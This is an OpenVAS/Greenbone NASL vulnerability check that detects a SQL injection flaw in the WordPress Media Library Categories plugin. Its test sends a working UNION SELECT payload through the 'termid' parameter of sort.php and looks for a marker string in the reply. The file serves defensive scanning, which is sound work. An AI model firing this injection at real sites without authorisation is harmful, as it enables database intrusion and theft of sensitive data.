# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802322");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-08-12 14:44:50 +0200 (Fri, 12 Aug 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress Media Library Categories Plugin 'termid' Parameter SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/45534");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49062");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17628/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103756/medialibrarycategories-sql.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to perform SQL Injection attack
  and gain sensitive information.");

  script_tag(name:"affected", value:"WordPress Media Library Categories plugin version 1.0.6 and prior.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input passed
  via the 'termid' parameter to '/wp-content/plugins/media-library-categories
  /sort.php', which allows attackers to manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"Update to WordPress Media Library Categories plugin version 1.0.7 or later");

  script_tag(name:"summary", value:"The WordPress plugin 'Media Library Categories' is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/media-library-categories/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

vtstrings = get_vt_strings();

url = dir + "/wp-content/plugins/media-library-categories/sort.php?termid=-1" +
            "%20UNION%20ALL%20SELECT%200x"+ vtstrings["default_hex"] + "," +
            "NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL," +
            "NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL," +
            "NULL,NULL--";

if(http_vuln_check(port:port, url:url, pattern:vtstrings["default"])){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
